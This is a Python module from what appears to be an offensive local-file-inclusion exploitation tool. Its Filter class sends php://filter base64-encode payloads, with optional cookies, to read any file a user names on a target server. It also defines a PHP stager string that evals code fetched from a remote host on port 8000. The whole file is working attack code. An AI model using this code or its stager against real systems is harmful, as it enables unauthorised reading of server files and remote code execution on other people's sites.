#!/usr/bin/env python3

from .utils import attack, colors, cook

from .Detection import Detection

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"

class Filter:
    def __init__(self, args):

        self.target = args.url
        self.cookies = args.cookies
        self.detection = args.detection

    def attack(self, payload):
        payload = f"php://filter/convert.base64-encode/resource={payload}"
        if self.cookies:
            cookies = cook(self.cookies)
            response = attack(self.target, payload, cookies=cookies)
        else:
            response = attack(self.target, payload)
        return response

    def execute_filter(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        """ Build payload """

        f_file = input(colors("[?] Please Enter File To Read: ", 94))
        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)

        if self.cookies:
            cookies = cook(self.cookies)
            attack(self.target, payload, cookies=cookies)
        else:
            attack(self.target, payload)
